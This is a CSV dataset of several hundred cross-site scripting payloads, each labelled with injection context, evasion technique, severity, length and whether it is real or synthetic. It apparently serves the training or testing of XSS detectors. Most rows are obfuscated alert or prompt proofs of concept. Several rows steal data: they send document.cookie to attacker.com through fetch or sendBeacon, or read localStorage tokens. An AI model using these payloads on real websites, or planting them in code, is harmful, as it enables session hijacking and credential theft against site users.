payload,context,technique,severity,length,source
\' ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,medium,64,synthetic
<a/OnkEypResS=cOnfIrm(1)>,tag_injection,synthetic,medium,25,synthetic
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",tag_injection,none,medium,166,real
%3Cbase ontransitionstart=prompt(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
<baSe OniNvaLid=coNfiRm(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,40,synthetic
ongotpointercapture=javascript:prompt(location.hash),event_handler,synthetic,medium,52,synthetic
' ><svG oNtrAnsItiOneNd=AleRt(1)>,attribute_escape,synthetic,medium,33,synthetic
"<menu oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
"<b onmouseup=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,41,real
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=print()></u>",tag_injection,none,low,104,real
OnwAitIng=coNfiRm/*x*/(dOcuMenT.dOmaIn),event_handler,synthetic,low,39,synthetic
<img src=validimage.png onload=alert(1)>,tag_injection,none,medium,40,real
"""><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
'><img src=x onchange=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
__proto__[%22onfocus%22]=console.log(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,79,synthetic
<plaintext onrepeat=prompt(%27XSS%27)>,tag_injection,synthetic,medium,38,synthetic
onk&#101;ydown=confirm&#40;1&#41;,event_handler,synthetic,low,33,synthetic
{alert('document.cookie')},dom_sink,none,high,26,real
"location=""javascript:alert(1)""",dom_sink,synthetic,high,30,synthetic
<%= \u0061lert 'XSS' %>,template_injection,synthetic,low,23,synthetic
'%3E%3Cimg src=x oncut=alert('XSS')%3E,attribute_escape,synthetic,medium,38,synthetic
OndRop=jaVasCriPt:ConSolE.lOg(DocUmeNt.DomAin),event_handler,synthetic,medium,46,synthetic
"location.href=""javascript:XMLHttpRequest(localStorage.getItem('token'))""",dom_sink,synthetic,high,72,synthetic
OnkEydOwn=coNfiRm&#40;'XSS'&#41;,event_handler,synthetic,low,32,synthetic
OnsTalLed=jaVasCriPt:ProMpt(1),event_handler,synthetic,medium,30,synthetic
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",tag_injection,none,medium,101,real
&lt;BODY ONLOAD=alert('AnonKryptiQuz')&gt;,event_handler,none,medium,42,real
<%= confirm %27XSS%27 %>,template_injection,synthetic,low,24,synthetic
"<m&#101;t&#97;/onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,89,synthetic
"SetIntErvAl(""coNfiRm(StrIng.frOmCHarCodE(88,83,83))"",100)",dom_sink,synthetic,high,57,synthetic
'><img src=x onpagehide=confirm(1)>,attribute_escape,synthetic,medium,35,synthetic
<svg><wbr onload=alert(1)></wbr>,tag_injection,none,medium,32,real
"<m&#97;rqu&#101;&#101;	onclos&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,84,synthetic
"<fieldset oncontextmenu=""alert(1)"">AnonKryptiQuz</fieldset>",tag_injection,none,medium,59,real
${{confirm(%27XSS%27)}},template_injection,synthetic,medium,23,synthetic
"<dialog draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,88,real
"""><a onsearch=alert(1)>",tag_injection,synthetic,medium,23,synthetic
""" ><svG oNclIck=prOmpT('XSS')>",attribute_escape,synthetic,medium,30,synthetic
[45].some.alert(),generic,none,medium,17,real
"(n&#101;w Function(""&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""))();",dom_sink,synthetic,low,140,synthetic
<xmp x=y ontransitionend=alert(location.hash)>,tag_injection,synthetic,medium,46,synthetic
"<sub draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,59,real
<td x=y onwebkitanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,47,synthetic
"<xmP oNtoUchEnd=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) oNtoUchEnd=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,113,synthetic
&quOt; onErrOr=AleRt(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,46,synthetic
<!--><TitLe OnmOzfUllScrEenChaNge=prOmpT('XSS')>,tag_injection,synthetic,medium,48,synthetic
"<p
onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,60,synthetic
' %3E%3Csvg onsearch=confirm(1)%3E,attribute_escape,synthetic,medium,34,synthetic
""" ><svG oNprOmpTacTioN=pRomPt(1)>",attribute_escape,synthetic,medium,33,synthetic
\%22 onselect=confirm(location.hash)//,attribute_escape,synthetic,medium,38,synthetic
' onwebkitfullscreenchange=prompt('XSS') ',attribute_escape,synthetic,medium,42,synthetic
<multicol onpointerdown=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,77,real
OnwEbkItaNimAtiOneNd=AleRt/*x*/(1),event_handler,synthetic,low,34,synthetic
&quot; oninvalid=alert(document.domain) x=&quot;,attribute_escape,synthetic,medium,48,synthetic
"<output onmousedown=""alert(1)"">AnonKryptiQuz</output>",tag_injection,none,medium,53,real
<anImaTe OnfOcuS=cOnsOle.loG(dOcuMenT.dOmaIn) onFocUs=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,83,synthetic
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",generic,encoding,high,76,real
"__proto__[""onbeforeinput""]=confirm(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,73,synthetic
<taBle	onSelEct=prOmpT(1)>,tag_injection,synthetic,medium,26,synthetic
<a/OnsEarCh=AleRt(1)>,tag_injection,synthetic,medium,21,synthetic
	onmouseup=console.log('XSS'),event_handler,synthetic,medium,29,synthetic
"""><img src=x ons&#101;&#97;rch=confirm(1)>",attribute_escape,synthetic,medium,42,synthetic
onrepeat=javascript:\u0061lert('XSS'),event_handler,synthetic,low,37,synthetic
"<div onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,68,synthetic
"<a href=""\xE2\x80\x80javascript:javascript:alert(7838)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
' oNtoGglE=cOnfIrm('XSS') ',attribute_escape,synthetic,medium,27,synthetic
<scr	ipt>//confirm(1)</scr	ipt>,script_injection,synthetic,medium,31,synthetic
"<animatetransform oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,109,real
{{constructor.constructor(‘alert(1)’)()}},template_injection,none,medium,41,real
"""%3E%3Cimg src=x ontouchmove=confirm(document.domain)%3E",attribute_escape,synthetic,medium,56,synthetic
"%22><img src=x ondragover=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,69,synthetic
"<custom tags onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",tag_injection,none,medium,83,real
"""><m&#101;t&#97; ons&#101;curitypolicyviol&#97;tion=prompt('XSS')>",tag_injection,synthetic,medium,66,synthetic
"JavAscRipT:%0apRomPt(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,high,51,synthetic
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,script_injection,case_variation,medium,39,real
%22><img src=x onpromptdismiss=prompt(document.domain)>,attribute_escape,synthetic,medium,55,synthetic
#&lt;img&#47;src&#47;onerror=alert(`AnonKryptiQuz`)&gt;,event_handler,html_entity,medium,55,real
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></keygen>",tag_injection,none,medium,116,real
' oNfoCusIn=ProMpt(1) ',attribute_escape,synthetic,medium,23,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#101;v&#97;l(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,low,182,synthetic
"<hgroup onmousemove=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,53,real
<ins onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65,real
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>,dom_sink,url_encoding,high,84,real
	onfocusin=\u0061lert(1),event_handler,synthetic,low,24,synthetic
onpromptdismiss=javascript:prompt(1),event_handler,synthetic,medium,36,synthetic
<%= alErt doCumEnt.coOkiE %>,template_injection,synthetic,high,28,synthetic
"<a2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,77,real
"eval(""XMLHttpRequest(String.fromCharCode(88,83,83))"")",dom_sink,synthetic,high,53,synthetic
<ifr&#97;m&#101; src=x ons&#101;curitypolicyviol&#97;tion=confirm('XSS')>,tag_injection,synthetic,medium,73,synthetic
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,tag_injection,none,medium,77,real
<xmP sRc=X oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,48,synthetic
<animatetransform oncontextmenu=prompt(document.domain)/>,tag_injection,synthetic,medium,57,synthetic
"<video draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,68,real
%3Cxss onmouseover=console.log('XSS') onmouseover=console.log('XSS')%3E,tag_injection,synthetic,medium,71,synthetic
"<abbr onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,61,real
%22 onclose=alert(document.domain) %22,attribute_escape,synthetic,medium,38,synthetic
"<label draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,66,real
`><img src=x onfocusout=console.log(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
%3C!--%3E%3Cbase onkeydown=alert('XSS')%3E,tag_injection,synthetic,medium,42,synthetic
${confirm?n&#101;w()('docum&#101;nt.cooki&#101;')},template_injection,synthetic,low,50,synthetic
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<!-- injection --><svg height=""50px"">",attribute_escape,comment_injection,low,37,real
"""%3E%3Ctable onsearch=prompt(1)%3E",tag_injection,synthetic,medium,34,synthetic
""" onmous&#101;down=confirm(1) """,attribute_escape,synthetic,medium,31,synthetic
<!--><BasE oNpoIntEruP=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,44,synthetic
"<caption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,73,real
"document.body.innerHTML=%22<img src=x onerror=alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22",dom_sink,synthetic,high,115,synthetic
' %3E%3Csvg onpause=console.log('XSS')%3E,attribute_escape,synthetic,medium,41,synthetic
"`><Img srC=x onResEt=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"`><img src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
"""><img src=x onw&#97;iting=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,61,synthetic
`><img src=x onbeforeinput=console.log(document.domain)>,attribute_escape,synthetic,medium,56,synthetic
"<picture onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",tag_injection,none,medium,73,real
'><script>confirm(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
"""%3E%3Cbody onbeforecut=confirm(document.domain)%3E",tag_injection,synthetic,medium,51,synthetic
<!--><audio onpause=console.log(document.domain)>,tag_injection,synthetic,medium,49,synthetic
""" on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,low,86,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":&#97;l&#101;rt})",dom_sink,synthetic,low,75,synthetic
"<p v-show=""_c.constructor`alert(1)`()"">",attribute_escape,none,medium,39,real
' %3E%3Csvg ontouchstart=console.log(document.domain)%3E,attribute_escape,synthetic,medium,56,synthetic
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",js_uri,none,medium,87,real
document.body.innerHTML=%22<img src=x onerror=eval(document.domain)>%22,dom_sink,synthetic,high,71,synthetic
' ><svg ong&#101;stur&#101;&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,67,synthetic
"<nextid onmousedown=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,53,real
%27><script>confirm(location.hash)</script>,script_injection,synthetic,medium,43,synthetic
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",tag_injection,none,medium,113,real
j&#97;vascr	ipt:console.log(location.hash),js_uri,synthetic,medium,42,synthetic
"<abbr oncut=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,59,real
ongotpointercapture=javascr	ipt:console.log('XSS'),event_handler,synthetic,medium,50,synthetic
""" ><svg onpointermove=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
' onpromptdismiss=\u0061lert(document.domain) ',attribute_escape,synthetic,low,47,synthetic
'><img src=x ons&#101;&#97;rch=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,49,synthetic
"<object draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,90,real
%3Cobject ontouchstart=console.log(location.hash)%3E,tag_injection,synthetic,medium,52,synthetic
"<style>@keyframes x{}</style><i style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></i>",tag_injection,none,medium,95,real
 onhashchange=alert(%27XSS%27),event_handler,synthetic,medium,30,synthetic
%3Canimatetransform onpointermove=console.log('XSS') onpointermove=console.log('XSS')%3E,tag_injection,synthetic,medium,88,synthetic
<foRm	OnwAitIng=coNfiRm(1)>,tag_injection,synthetic,medium,27,synthetic
"<tr onmouseenter=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,46,real
'><Img srC=x onErrOr=ConFirM(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,44,synthetic
&quOt; onPopStaTe=ConFirM(dOcuMenT.dOmaIn) x=&quOt;,attribute_escape,synthetic,medium,51,synthetic
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>,tag_injection,none,medium,55,real
"%3Canimatemotion
ondrop=confirm(location.hash)%3E",tag_injection,synthetic,medium,49,synthetic
"<var onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</var>",tag_injection,none,medium,63,real
%3Cmarquee/onscrollsnapchange=prompt(1)%3E,tag_injection,synthetic,medium,42,synthetic
"%22 ><svg onerror=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
`><img src=x ontransitionrun=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,52,synthetic
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,62,real
onpageshow=alert&#40;%27XSS%27&#41;,event_handler,synthetic,low,35,synthetic
"""><img src=x onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,medium,73,synthetic
<input4 onpointerout=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,72,real
onkeydown=javascript:alert('XSS'),event_handler,synthetic,medium,33,synthetic
'><img src=x onkeydown=\u0061lert(location.hash)>,attribute_escape,synthetic,low,49,synthetic
"""><script>consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,low,75,synthetic
OniNvaLid=coNfiRm(1),event_handler,synthetic,medium,20,synthetic
"<marquee id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></marquee>",tag_injection,none,medium,90,real
"<style>:target {color: red;}</style><custom tags id=x style=""transition:color 10s"" ontransitioncancel=print()></custom tags>",tag_injection,none,low,124,real
<D3/OnMouSEenTer=[2].find(confirm)>z,tag_injection,case_variation,low,36,real
"<script	>consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,low,74,synthetic
' onb&#101;for&#101;m&#97;tch=confirm(1) ',attribute_escape,synthetic,medium,42,synthetic
' ><svg onbeforecut=confirm(1)>,attribute_escape,synthetic,medium,31,synthetic
<textarea onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"EvaL(""ConSolE.lOg(LocAtiOn.HasH)"")",dom_sink,synthetic,medium,34,synthetic
<mt&#101;xt src=x onmous&#101;down=consol&#101;.log(1)>,tag_injection,synthetic,low,55,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onprompt&#97;ction"":consol&#101;.log})",dom_sink,synthetic,low,70,synthetic
ondrop=alert(document.domain),event_handler,synthetic,medium,29,synthetic
"<style>:target {color:red;}</style><a2 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></a2>",tag_injection,none,medium,108,real
'><img src=x onplaying=\u0061lert(location.hash)>,attribute_escape,synthetic,low,49,synthetic
onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,66,synthetic
""" oNtoGglE=pRomPt(1) """,attribute_escape,synthetic,medium,22,synthetic
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionstart=alert(1)></section>",tag_injection,none,medium,114,real
"'><img src=x ontransitionrun=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,71,synthetic
"__proto__[""onmouseenter""]=fetch('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,69,synthetic
"SetIntErvAl(""alErt(loCalStoRagE.gEtITem('tOkeN'))"",100)",dom_sink,synthetic,high,55,synthetic
\%22 onfullscreenchange=alert(location.hash)//,attribute_escape,synthetic,medium,46,synthetic
<button popovertarget=x>Click me</button><tfoot ontoggle=alert(1) popover id=x>AnonKryptiQuz</tfoot>,tag_injection,none,medium,100,real
"<iframe2 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,75,real
%22 ><svg onwaiting=prompt(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
"<data onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</data>",tag_injection,none,medium,84,real
OngOtpOinTerCapTurE=jAvaScrIpt:prOmpT(lOcaTioN.hAsh),event_handler,synthetic,medium,52,synthetic
`><img src=x oninput=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
' oNfoCusIn=ConSolE.lOg(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,40,synthetic
"%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",js_uri,url_encoding,low,101,real
OnfOcuSin=coNfiRm/**/(doCumEnt.doMaiN),event_handler,synthetic,low,38,synthetic
%22><img src=x oncopy=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,45,synthetic
' onpagereveal=\u0061lert(location.hash) ',attribute_escape,synthetic,low,42,synthetic
""" oNseLecT=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,high,50,synthetic
"<thead onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,83,real
"<dialog onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,74,real
eval(%22XMLHttpRequest(document.cookie+%27&loc=%27+location.href)%22),dom_sink,synthetic,high,69,synthetic
\' onbeforecut=confirm(1)//,attribute_escape,synthetic,medium,27,synthetic
"<tfoot draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",tag_injection,none,medium,87,real
' %3E%3Csvg onwebkitanimationend=console.log(document.domain)%3E,attribute_escape,synthetic,medium,64,synthetic
"""><img src=x onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,89,synthetic
onbeforematch=prompt&#40;%27XSS%27&#41;,event_handler,synthetic,low,39,synthetic
"<samp draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,85,real
"<caption draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</caption>",tag_injection,none,medium,67,real
<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(1)”>,tag_injection,url_encoding,low,73,real
""" onp&#97;g&#101;r&#101;v&#101;&#97;l=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,69,synthetic
<input4 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,74,real
<svg onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,113,synthetic
"<article oncut=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,65,real
onmouseenter=confirm&#40;location.hash&#41;,event_handler,synthetic,low,43,synthetic
__proto__[%22onselect%22]=alert(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,74,synthetic
""" onpromptdismiss=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,49,synthetic
%3Cvideo onmozfullscreenchange=prompt('XSS')/%3E,tag_injection,synthetic,medium,48,synthetic
"<applet ondblclick=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,52,real
<BODY ONLOAD=alert(�AnonKryptiQuz�)>,tag_injection,case_variation,medium,36,real
"""%3E%3Cnoscript onpointerdown=prompt(document.domain)%3E",tag_injection,synthetic,medium,56,synthetic
"""><img src=x onpause=console.log(document.domain)>",attribute_escape,synthetic,medium,50,synthetic
&quot; onpointerrawupdate=\u0061lert(location.hash) x=&quot;,attribute_escape,synthetic,low,60,synthetic
' ><svG oNfoCus=prOmpT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,38,synthetic
<liNk OnwAitIng=coNfiRm(1)/>,tag_injection,synthetic,medium,28,synthetic
"&#101;v&#97;l(""consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"")",dom_sink,synthetic,low,92,synthetic
<multicol onpointerout=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,76,real
"<a href=""\xC2\xA0javascript:javascript:alert(2762)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,78,real
"""><EmbEd OnwEbkItfUllScrEenChaNge=coNfiRm(LocAtiOn.HasH)>",tag_injection,synthetic,medium,57,synthetic
`><img src=x ongesturestart=prompt('XSS')>,attribute_escape,synthetic,medium,42,synthetic
<button popovertarget=x>Click me</button><set ontoggle=alert(1) popover id=x>AnonKryptiQuz</set>,tag_injection,none,medium,96,real
""" ontouchmove=\u0061lert(location.hash) """,attribute_escape,synthetic,low,41,synthetic
""" ><svG oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.dOmaIn)>",attribute_escape,synthetic,medium,58,synthetic
"<slot onmouseover=""alert(1)"">AnonKryptiQuz</slot>",tag_injection,none,medium,49,real
<xss/ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,43,synthetic
"\"" onscrollsnapchange=\u0061lert(1)//",attribute_escape,synthetic,low,37,synthetic
%3C!--%3E%3Cdialog onplay=prompt(document.domain)%3E,tag_injection,synthetic,medium,52,synthetic
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri,synthetic,high,56,synthetic
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>",tag_injection,none,medium,99,real
#set($x='alert(document.domain)')$x,template_injection,synthetic,medium,35,synthetic
<listing onpointerout=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,74,real
"<progress onclick=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,73,real
"<rtc draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,64,real
%3C!--%3E%3Cmarquee onauxclick=prompt(location.hash)%3E,tag_injection,synthetic,medium,55,synthetic
"""%3E%3Cimg src=x onvolumechange=confirm('XSS')%3E",attribute_escape,synthetic,medium,49,synthetic
"'><Img srC=x onPlaY=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"<script>setTimeout(%27console.log(1)%27,0)</script>",script_injection,synthetic,medium,51,synthetic
{phP}aLerT(dOcuMenT.cOokIe){/pHp},template_injection,synthetic,high,33,synthetic
"\"" OncOpy=alErt(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape,synthetic,high,48,synthetic
"<dialog onmouseout=""alert(1)"">AnonKryptiQuz</dialog>",tag_injection,none,medium,52,real
&quot; ondr&#97;gst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,75,synthetic
"<ul draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</ul>",tag_injection,none,medium,62,real
"&#101;v&#97;l(""&#101;v&#97;l(bto&#97;(docum&#101;nt.cooki&#101;))"")",dom_sink,synthetic,low,67,synthetic
'><img src=x onmouseenter=alert(location.hash)>,attribute_escape,synthetic,medium,47,synthetic
<</script/script><script ~~~>\u0061lert(1)</script ~~~>,script_injection,unicode_escape,low,55,real
' oninv&#97;lid=confirm(1) ',attribute_escape,synthetic,medium,28,synthetic
[a](j a v a s c r i p t:prompt(document.cookie)),dom_sink,none,high,48,real
"\"" onmousewheel=prompt('XSS')//",attribute_escape,synthetic,medium,31,synthetic
%3Cimage	onend=prompt(1)%3E,tag_injection,synthetic,medium,27,synthetic
`%3E%3Cimg src=x ontouchend=console.log('XSS')%3E,attribute_escape,synthetic,medium,49,synthetic
' onauxclick=confirm(location.hash) ',attribute_escape,synthetic,medium,37,synthetic
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></main>",tag_injection,none,medium,112,real
<area onpointerout=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,68,real
	onr&#101;s&#101;t=confirm('XSS'),event_handler,synthetic,medium,33,synthetic
javascr	ipt:console.log/**/(document.domain),js_uri,synthetic,low,44,synthetic
on&#101;nd=prompt(1),event_handler,synthetic,medium,20,synthetic
"""><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,99,synthetic
%22><img src=x onwebkittransitionend=confirm(location.hash)>,attribute_escape,synthetic,medium,60,synthetic
 onTouChmOve=prOmpT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,36,synthetic
"""%3E%3Cblink onkeypress=prompt(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
"<video draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,87,real
